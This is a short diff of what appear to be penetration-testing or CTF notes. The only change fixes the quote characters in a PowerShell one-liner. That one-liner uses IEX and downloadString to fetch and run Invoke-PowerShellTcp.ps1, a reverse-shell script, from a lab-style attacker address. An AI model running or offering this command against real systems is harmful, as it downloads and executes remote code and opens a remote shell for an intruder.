@@ -1,6 +1,6 @@
 way 1 =>
 
-powershell.exe “IEX(New-Object Net.WebClient).downloadString(‘http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')"
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')"
 
 way 2 ==> better
 
